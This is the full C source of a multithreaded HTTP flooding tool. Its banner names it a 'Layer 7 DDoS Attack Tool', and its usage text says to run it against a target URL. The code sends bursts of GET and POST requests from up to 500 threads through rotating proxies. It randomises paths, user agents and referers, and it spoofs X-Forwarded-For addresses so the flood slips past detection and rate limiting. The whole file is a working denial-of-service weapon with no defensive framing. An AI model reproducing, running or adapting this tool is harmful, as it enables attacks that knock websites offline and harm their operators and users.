#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define MAX_WORKERS 500
#define MAX_URL_LEN 2048
#define BUFFER_SIZE 8192
#define MAX_PROXIES 10000
#define MAX_ADAPTIVE_DELAY 8000

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    NULL
};

const char *LANGUAGES[] = {"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", NULL};
const char *REFERERS[] = {"https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", NULL};
const char *ACCEPTS[] = {"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json, text/plain, */*", NULL};

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    long long requests;
    long long responses;
    long long errors;
    long long total_latency;
    pthread_mutex_t mutex;
} AtomicStats;

typedef struct {
    char target_host[256];
    int target_port;
    char target_path[512];
    char target_url[1024];
    char methods[10][10];
    int method_count;
    int duration_sec;
    int concurrency;
    int burst_size;
    int think_time_ms;
    bool random_path;
    bool random_ip;
    bool burst_mode;
    bool adaptive_delay;
    char proxy_file[256];
} AttackConfig;

ProxyList proxy_list = {0};
AtomicStats stats = {0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t worker_threads[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
int64_t current_delay = 0;
pthread_mutex_t delay_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned int rand_state;

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

const char* get_random_user_agent() {
    int count = 0;
    while (USER_AGENTS[count] != NULL) count++;
    return USER_AGENTS[rand_int(0, count - 1)];
}

const char* get_random_language() {
    int count = 0;
    while (LANGUAGES[count] != NULL) count++;
    return LANGUAGES[rand_int(0, count - 1)];
}

const char* get_random_referer() {
    int count = 0;
    while (REFERERS[count] != NULL) count++;
    return REFERERS[rand_int(0, count - 1)];
}

char* generate_random_path(const char *base_url) {
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    strcpy(result, base_url);
    int len = strlen(result);
    if (result[len-1] == '/') result[len-1] = '\0';
    snprintf(result + strlen(result), MAX_URL_LEN - strlen(result), "/%x", rand_int(0, 0xfffff));
    char query[256];
    snprintf(query, sizeof(query), "?v=%d&_=%ld", rand_int(0, 99999), time(NULL));
    strcat(result, query);
    return result;
}

void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf(COLOR_RED "[-] Failed to load proxies file: %s\n" COLOR_RESET, filename);
        return;
    }
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), file) && proxy_list.count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        if (strlen(line) > 0 && strchr(line, ':')) {
            proxy_list.proxies[proxy_list.count] = strdup(line);
            proxy_list.count++;
        }
    }
    
    fclose(file);
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void send_http_request(AttackConfig *cfg, const char *proxy) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char full_url[MAX_URL_LEN];
    const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
    char *path = cfg->random_path ? generate_random_path(cfg->target_url) : strdup(cfg->target_path);
    
    snprintf(full_url, sizeof(full_url), "%s%s", cfg->target_url, path);
    
    struct curl_slist *headers = NULL;
    const char *ua = get_random_user_agent();
    const char *lang = get_random_language();
    const char *referer = get_random_referer();
    char *ip = NULL;
    
    if (cfg->random_ip) {
        ip = random_ip();
    }
    
    char ua_header[512];
    char lang_header[256];
    char ref_header[512];
    char ip_header[256];
    
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua);
    snprintf(lang_header, sizeof(lang_header), "Accept-Language: %s", lang);
    snprintf(ref_header, sizeof(ref_header), "Referer: %s", referer);
    
    headers = curl_slist_append(headers, ua_header);
    headers = curl_slist_append(headers, lang_header);
    headers = curl_slist_append(headers, ref_header);
    
    if (ip) {
        snprintf(ip_header, sizeof(ip_header), "X-Forwarded-For: %s", ip);
        headers = curl_slist_append(headers, ip_header);
    }
    
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Cache-Control: no-cache");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    
    if (proxy) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
    }
    
    if (strcmp(method, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
    } else if (strcmp(method, "HEAD") == 0) {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    } else {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    }
    
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    CURLcode res = curl_easy_perform(curl);
    
    gettimeofday(&end, NULL);
    long latency = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
    
    pthread_mutex_lock(&stats.mutex);
    stats.requests++;
    if (res == CURLE_OK) {
        stats.responses++;
        stats.total_latency += latency;
    } else {
        stats.errors++;
    }
    pthread_mutex_unlock(&stats.mutex);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(path);
    if (ip) free(ip);
}

void* worker_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        char *proxy = (cfg->proxy_file[0] && proxy_list.count > 0) ? get_random_proxy() : NULL;
        
        int burst_count = cfg->burst_mode ? (1 + rand_int(0, cfg->burst_size)) : 1;
        
        for (int i = 0; i < burst_count && running; i++) {
            send_http_request(cfg, proxy);
            
            if (i < burst_count - 1) {
                usleep(rand_int(10, 50) * 1000);
            }
        }
        
        if (proxy) free(proxy);
        
        int64_t delay = 0;
        pthread_mutex_lock(&delay_mutex);
        delay = current_delay;
        pthread_mutex_unlock(&delay_mutex);
        
        int think_time = rand_int(0, cfg->think_time_ms);
        usleep((delay + think_time) * 1000);
        
        if (cfg->adaptive_delay) {
            pthread_mutex_lock(&delay_mutex);
            if (current_delay > 0) {
                current_delay = (int64_t)(current_delay * 0.95);
            }
            pthread_mutex_unlock(&delay_mutex);
        }
    }
    
    return NULL;
}

void* stats_printer_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        
        long long requests, responses, errors, total_lat;
        
        pthread_mutex_lock(&stats.mutex);
        requests = stats.requests;
        responses = stats.responses;
        errors = stats.errors;
        total_lat = stats.total_latency;
        pthread_mutex_unlock(&stats.mutex);
        
        double rps = elapsed > 0 ? requests / elapsed : 0;
        double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
        
        printf("\r\033[K");
        printf(COLOR_CYAN "[%.0fs/%ds] " COLOR_RESET, elapsed, cfg->duration_sec);
        printf(COLOR_GREEN "Req: %lld " COLOR_RESET, requests);
        printf(COLOR_YELLOW "Res: %lld " COLOR_RESET, responses);
        printf(COLOR_RED "Err: %lld " COLOR_RESET, errors);
        printf(COLOR_WHITE "RPS: %.0f " COLOR_RESET, rps);
        printf(COLOR_BLUE "Lat: %.0fms" COLOR_RESET, avg_latency);
        fflush(stdout);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗║\n");
    printf("║    ██╔════╝██╔══██╗╚══███╔╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝║\n");
    printf("║    ██║     ███████║  ███╔╝ ███████╗ ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗║\n");
    printf("║    ██║     ██╔══██║ ███╔╝  ╚════██║  ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║║\n");
    printf("║    ╚██████╗██║  ██║███████╗███████║   ██║   ██████╔╝██████╔╝╚██████╔╝███████║║\n");
    printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝║\n");
    printf("║                                                                            ║\n");
    printf("║                         C A Z Z Y D D O S   A T T A C K                    ║\n");
    printf("║                          Layer 7 DDoS Attack Tool                         ║\n");
    printf("╚════════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    AttackConfig cfg = {0};
    
    cfg.duration_sec = 60;
    cfg.concurrency = 100;
    cfg.burst_size = 10;
    cfg.think_time_ms = 100;
    cfg.random_path = false;
    cfg.random_ip = true;
    cfg.burst_mode = true;
    cfg.adaptive_delay = false;
    cfg.method_count = 2;
    strcpy(cfg.methods[0], "GET");
    strcpy(cfg.methods[1], "POST");
    cfg.proxy_file[0] = '\0';
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
            strncpy(cfg.target_url, argv[++i], 1023);
            cfg.target_url[1023] = '\0';
        } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
            cfg.duration_sec = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
            cfg.concurrency = atoi(argv[++i]);
            if (cfg.concurrency > MAX_WORKERS) cfg.concurrency = MAX_WORKERS;
        } else if (strcmp(argv[i], "-methods") == 0 && i+1 < argc) {
            char *token = strtok(argv[++i], ",");
            cfg.method_count = 0;
            while (token && cfg.method_count < 10) {
                strncpy(cfg.methods[cfg.method_count++], token, 9);
                token = strtok(NULL, ",");
            }
        } else if (strcmp(argv[i], "-random-path") == 0) {
            cfg.random_path = true;
        } else if (strcmp(argv[i], "-adaptive-delay") == 0) {
            cfg.adaptive_delay = true;
        } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
            strncpy(cfg.proxy_file, argv[++i], 255);
            cfg.proxy_file[255] = '\0';
        } else if (strcmp(argv[i], "-help") == 0) {
            print_banner();
            printf("\nUsage: %s [options]\n\n", argv[0]);
            printf("Options:\n");
            printf("  -url <url>           Target URL (required)\n");
            printf("  -duration <sec>      Duration in seconds (default: 60)\n");
            printf("  -concurrency <n>     Concurrent workers (default: 100)\n");
            printf("  -methods <list>      HTTP methods (default: GET,POST)\n");
            printf("  -random-path         Randomize request paths\n");
            printf("  -adaptive-delay      Enable adaptive delay\n");
            printf("  -proxy-file <file>   Proxy list file\n");
            printf("  -help                Show this help\n");
            printf("\nExample:\n");
            printf("  %s -url https://example.com -duration 30 -concurrency 200 -random-path\n", argv[0]);
            return 0;
        }
    }
    
    if (strlen(cfg.target_url) == 0) {
        print_banner();
        printf(COLOR_RED "\n[-] Error: -url is required\n" COLOR_RESET);
        return 1;
    }
    
    char *host_start;
    if (strstr(cfg.target_url, "://")) {
        host_start = strstr(cfg.target_url, "://") + 3;
    } else {
        host_start = cfg.target_url;
    }
    
    char *path_start = strchr(host_start, '/');
    if (path_start) {
        size_t host_len = path_start - host_start;
        if (host_len < sizeof(cfg.target_host)) {
            memcpy(cfg.target_host, host_start, host_len);
            cfg.target_host[host_len] = '\0';
        }
        strncpy(cfg.target_path, path_start, sizeof(cfg.target_path) - 1);
        cfg.target_path[sizeof(cfg.target_path) - 1] = '\0';
    } else {
        strncpy(cfg.target_host, host_start, sizeof(cfg.target_host) - 1);
        cfg.target_host[sizeof(cfg.target_host) - 1] = '\0';
        strcpy(cfg.target_path, "/");
    }
    
    cfg.target_port = 443;
    char *port_sep = strchr(cfg.target_host, ':');
    if (port_sep) {
        *port_sep = '\0';
        cfg.target_port = atoi(port_sep + 1);
    }
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.proxy_file[0]) {
        load_proxies(cfg.proxy_file);
    }
    
    print_banner();
    printf(COLOR_CYAN "\n[+] Target: %s\n" COLOR_RESET, cfg.target_url);
    printf(COLOR_CYAN "[+] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_CYAN "[+] Concurrency: %d\n" COLOR_RESET, cfg.concurrency);
    printf(COLOR_CYAN "[+] Methods: ");
    for (int i = 0; i < cfg.method_count; i++) {
        printf("%s ", cfg.methods[i]);
    }
    printf("\n" COLOR_RESET);
    printf(COLOR_CYAN "[+] Random Path: %s\n" COLOR_RESET, cfg.random_path ? "Enabled" : "Disabled");
    printf(COLOR_CYAN "[+] Random IP: %s\n" COLOR_RESET, cfg.random_ip ? "Enabled" : "Disabled");
    printf(COLOR_CYAN "[+] Adaptive Delay: %s\n" COLOR_RESET, cfg.adaptive_delay ? "Enabled" : "Disabled");
    if (cfg.proxy_file[0]) {
        printf(COLOR_CYAN "[+] Proxies: %s\n" COLOR_RESET, cfg.proxy_file);
    }
    
    printf(COLOR_YELLOW "\n[!] Starting attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    pthread_create(&stats_thread, NULL, stats_printer_function, &cfg);
    
    AttackConfig *configs = malloc(sizeof(AttackConfig) * cfg.concurrency);
    for (int i = 0; i < cfg.concurrency; i++) {
        memcpy(&configs[i], &cfg, sizeof(AttackConfig));
        pthread_create(&worker_threads[i], NULL, worker_function, &configs[i]);
    }
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < cfg.concurrency; i++) {
        pthread_join(worker_threads[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long requests, responses, errors, total_lat;
    
    pthread_mutex_lock(&stats.mutex);
    requests = stats.requests;
    responses = stats.responses;
    errors = stats.errors;
    total_lat = stats.total_latency;
    pthread_mutex_unlock(&stats.mutex);
    
    double avg_rps = (double)requests / cfg.duration_sec;
    double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
    double success_rate = requests > 0 ? (double)responses / requests * 100 : 0;
    
    printf("\n\n" COLOR_MAGENTA "========== FINAL STATISTICS ==========\n" COLOR_RESET);
    printf(COLOR_CYAN "Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "Total Requests: %lld\n" COLOR_RESET, requests);
    printf(COLOR_YELLOW "Responses: %lld\n" COLOR_RESET, responses);
    printf(COLOR_RED "Errors: %lld\n" COLOR_RESET, errors);
    printf(COLOR_WHITE "Success Rate: %.2f%%\n" COLOR_RESET, success_rate);
    printf(COLOR_WHITE "Average RPS: %.2f\n" COLOR_RESET, avg_rps);
    printf(COLOR_WHITE "Average Latency: %.2fms\n" COLOR_RESET, avg_latency);
    printf(COLOR_MAGENTA "=========================================\n" COLOR_RESET);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(configs);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
